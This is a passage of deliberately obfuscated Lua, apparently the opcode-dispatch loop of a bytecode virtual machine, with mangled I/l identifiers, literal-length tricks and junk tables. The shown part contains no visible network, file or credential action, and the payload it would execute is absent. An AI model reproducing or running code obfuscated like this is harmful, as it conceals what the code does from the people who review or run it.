ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[1];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[3];local ajefa_lllIlllllIIlI=ajefa_lllIIlIllIlIllllIIlIIlll[2];local ajefa_llIIllIIIIlI=ajefa_IIIlIllIlIllII local ajefa_IlIIIlIllIlIlllIlIlIllll=1;local ajefa_lIIIIIlIllIlllllllIIll=-1;local ajefa_lIlIllIlIlIlIIIlIllIllI={};local ajefa_IIIlIllIlIllII={...};local ajefa_lllIIllIIIIIlllIlllllII=ajefa_lllIIllIIIIIlllIlllllII('#',...)-1;local ajefa_IIIlIlIlIlIllIIllIIIIlII={};local ajefa_lIlllIll={};for ajefa_lllIIlIllIlIllllIIlIIlll=0,ajefa_lllIIllIIIIIlllIlllllII do if(ajefa_lllIIlIllIlIllllIIlIIlll>=ajefa_IIIlIllIllllIIllIlllIIll)then ajefa_lIlIllIlIlIlIIIlIllIllI[ajefa_lllIIlIllIlIllllIIlIIlll-ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IIIlIllIlIllII[ajefa_lllIIlIllIlIllllIIlIIlll+1];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IIIlIllIlIllII[ajefa_lllIIlIllIlIllllIIlIIlll+#{{73;786;395;508};}];end;end;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIllIIIIIlllIlllllII-ajefa_IIIlIllIllllIIllIlllIIll+1 local ajefa_lllIIlIllIlIllllIIlIIlll;local ajefa_IIIlIllIllllIIllIlllIIll;while true do ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("5")];if ajefa_IIIlIllIllllIIllIlllIIll<=#("uBSTJKkPag9Hp5FxCZS3Q1BcBL2PCpKWQIKxyjSvD7QW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vdEe9cbAdlDaPs7RFmVGm")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("Rui9rhxATk")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("2fIz")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("D")then if ajefa_IIIlIllIllllIIllIlllIIll==#("")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("IhV")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ha")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qcL")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("xM")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ir")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4KY")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IZR2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{42;319;450;733};{221;677;268;159};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("aOr")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("olgY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8q")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{308;677;93;803};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Iy8n")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("k5b")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("An9R")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("me")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TpS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nf")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ITP")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qpdh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ji")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("NlE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dx")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("zZP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gsb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lvbS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gy")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QhO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nXyL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{670;454;543;526};"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bGn")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{877;241;483;177};{709;435;847;902};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("12")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LiJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("JknK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e4")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fDO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Sxxj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("yh")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{953;951;332;766};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VH")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("5zm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("64")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j1M")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("nLU2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M0")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Umu")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H7")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4LM")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8Q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("LTq")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Cv")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{786;834;756;973};{748;322;622;822};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9D")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("N2u")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sWJ6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1V")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("kO0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hv")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("K0F")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3kya")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mj")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Z0")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ok")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("4fh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{752;945;870;68};{907;511;639;151};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YRS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("V9yi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2T")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1cA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{291;962;92;738};{421;491;374;123};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h3")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cRQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gcD7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MSl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Y81d")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("U2")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HQ8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("McG2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("dM")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yz")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{299;974;576;332};"1 + 1 = 111";{260;560;418;589};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("13")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3fh")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yskH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("QzQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("kZe")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J2")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("opk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("12")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("kyP")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OJN")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{737;847;88;525};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P2")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hbc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AOz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S9of")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xPS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("g17i")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9i")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JpC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qsMS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Np")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bpg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("5tuA")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("un")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("M01")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("SEFv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7x3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("p7mU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gg")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("PDh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1T")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D4s")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tZtI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("R3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vaG")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o9")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("AIV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{621;582;878;587};{593;390;836;966};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hou")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YTV7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Ck")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Vfyq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D6L")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fQCL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fa")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j5T")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("eCWv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j6")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{107;449;319;316};{11;36;510;868};{948;162;604;727};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oF2z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("bG")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("IzE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajef